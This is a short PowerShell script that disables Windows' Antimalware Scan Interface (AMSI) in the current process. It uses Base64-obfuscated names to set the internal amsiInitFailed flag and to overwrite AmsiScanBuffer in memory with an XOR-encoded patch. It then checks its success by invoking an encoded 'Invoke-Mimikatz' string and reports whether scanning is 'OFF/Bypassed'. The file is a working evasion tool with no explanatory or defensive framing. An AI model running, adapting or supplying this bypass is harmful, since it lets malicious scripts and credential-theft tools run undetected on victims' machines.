function Dec($s) {
    try { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) } catch { '' }
}
function Xor($b, $k) {
    $o = [byte[]]::new($b.Length)
    for ($i = 0; $i -lt $b.Length; $i++) { $o[$i] = $b[$i] -bxor $k[$i % $k.Length] }
    $o
}
function SetFlag {
    $t = [Ref].Assembly.GetType((Dec $b1))
    if ($t) {
        $f = $t.GetField((Dec $b2), 'NonPublic,Static')
        if ($f) { $f.SetValue($null, $true) }
    }
}
function PatchScan {
    $h = $k::GetModuleHandle((Dec $b3))
    $p = $k::GetProcAddress($h, (Dec $b4))
    if ($p -ne [IntPtr]::Zero) {
        $old = 0
        $k::VirtualProtect($p, 6, 0x40, [ref]$old) | Out-Null
        $patch = Xor $enc $key
        [Runtime.InteropServices.Marshal]::Copy($patch, 0, $p, 6)
        $k::VirtualProtect($p, 6, $old, [ref]$old) | Out-Null
    }
}

$b1 = 'U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='
$b2 = 'YW1zaUluaXRGYWlsZWQ='
$b3 = 'YW1zaS5kbGw='
$b4 = 'QW1zaVNjYW5CdWZmZXI='
$key = [byte[]](0x41, 0x42, 0x43)
$enc = [byte[]](0xF9, 0x15, 0x14, 0x43, 0x41, 0x80)
$k = Add-Type -Name K32 -Namespace K32 -PassThru -MemberDefinition @'
[DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);
'@

SetFlag
PatchScan

function D($s) { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }
$status = try {
    $null = [ScriptBlock]::Create((D 'SW52b2tlLU1pbWlrYXR6')).Invoke()
    'OFF/Bypassed'
} catch {
    if ($_.Exception.Message -like '*malicious*' -or $_.FullyQualifiedErrorId -like '*ScriptContainedMaliciousContent*') {
        'ON/Running'
    } else {
        'OFF/Bypassed'
    }
}
$value = if ($status -eq 'OFF/Bypassed') { $true } else { $false }

[pscustomobject]@{
    "AMSI Status" = $status
    "AMSI Value (amsiInitFailed)" = $value
} | Format-List